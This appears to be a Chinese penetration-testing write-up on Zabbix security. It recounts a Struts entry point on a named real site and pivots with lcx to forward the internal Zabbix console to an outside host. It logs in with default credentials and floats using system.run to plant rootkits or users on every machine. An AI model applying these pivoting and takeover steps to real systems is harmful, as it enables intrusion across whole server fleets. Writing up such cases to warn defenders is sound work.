# 当渗透遇到zabbix--小谈zabbix安全

**0x00 背景**

* * *

zabbix近几年得到了各大互联网公司的认可，其强大的功能得到了各位运维攻城狮的亲耐。 公司本身也用zabbix做监控，对其属性也有所了解。不得不说zabbix除了监控强大之外，还有一个很好的用处就是在你忘记root密码的时候，重置服务器root密码，朋友们也一致认为zabbix是一个无比强大的超级后门。 打开了一扇门，另外一扇门就会随之开启，大伙都知道zabbix有system.run模块，这是可以执行任意命令的。不过还得看agent是以什么权限启的，根据我自己的观察，大伙为了方便这个模块都会启用，而且一般情况下都会用root跑。不用root跑会有很多麻烦事情。在这样的情况下，某些时候不得不说也方便了方便黑客更好的到访,这里很多朋友都报着这样的想法，zabbix在内网，外网访问不了，即使有注入或弱口令或默认口令黑客也无法访问，下面用实例来告诉你这样的想法是错的，不管你信不信，反正我是信了。

**0x01 细节**

* * *

出场的是tom在线 漏洞源头

[http://fm.tom.com/login-share/tomlogin/login.action](http://fm.tom.com/login-share/tomlogin/login.action)struts漏洞，struts漏洞在现在看来实在太无技术含量，对于漏洞源头，就不需解释太多 在查询端口的时候，agent的10050端口会与server的通讯。（在有proxy的情况下zabbix_server不太确认） 确认zabbix_server为:172.24.162.38 一般在安装的时候会留下zabbix_agent的安装脚本，详细信息可以到脚本里面看到 ifconfig ip信息如下(这个是作为入侵到更多服务器的跳板)

```
eth2 Link encap:Ethernet HWaddr 00:18:8B:83:1B:45 
inet addr:172.24.205.15 Bcast:172.24.205.255 Mask:255.255.255.0
UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
RX packets:81041 errors:0 dropped:0 overruns:0 frame:0
TX packets:60 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:1000 
Interrupt:16 Memory:f8000000-f8012800 

```

只有内网，首先要确认思路，在没有外网IP的情况下，用IPtables做一个nat完全不能达到我们想要的需求，因为zabbix我们需要用IEl来访问，只能先做内网的nat，然后把端口转到公网的某个服务器上去 先确认些信息

```
curl http://172.24.162.38/zabbix/ #返回的是zabbix登陆页

```

确认好上面的一些信息后，接下来做一个nat

```
0.0.0.0 98 172.24.162.38 80

```

看下效果 这里会监听98端口，意思是当有访问本地98端口的时候自动转向172.24.162.38的80端口，接下来只需要将本地的98端口转发至公网的某个服务器就可以正常访问了

端口转发我用lcx(linux版)，这破玩意会经常断，不太好用。

```
./lcx -m 3 -h1 youip -p1 786 -h2 127.0.0.1 -p2 98

```

转发好之后就可以正常访问了

```
    http://youip:port/zabbix/(这里一定要记得加后面的/zabbix/，它本身就带了这个目录)

```

![](http://drops.javaweb.org/uploads/images/3632381f3aa88aec47411c709ce8e2c88e3db7c6.jpg)这个界面是我们想要的结果

```
    login:admin/zabbix (内网的zabbix大伙往往不喜欢改密码，都认为在内网很安全)

```

![](http://drops.javaweb.org/uploads/images/740c988c34f6b82295c8cc0a29c8b1e5f14bdf7b.jpg)

图截不完，下面其实还有很多。

![](http://drops.javaweb.org/uploads/images/e9c280cb9c5829a544526df5827736a89519a2e4.jpg)

接下来，可以有邪恶的想法了。添加一个监控项，给所有机器安装一个rootkit？还是全部机器添加一个用户？不要太邪恶了，只讨论思路，这样的边界问题很容易被忽略，但是带来的后果往往也是最大的。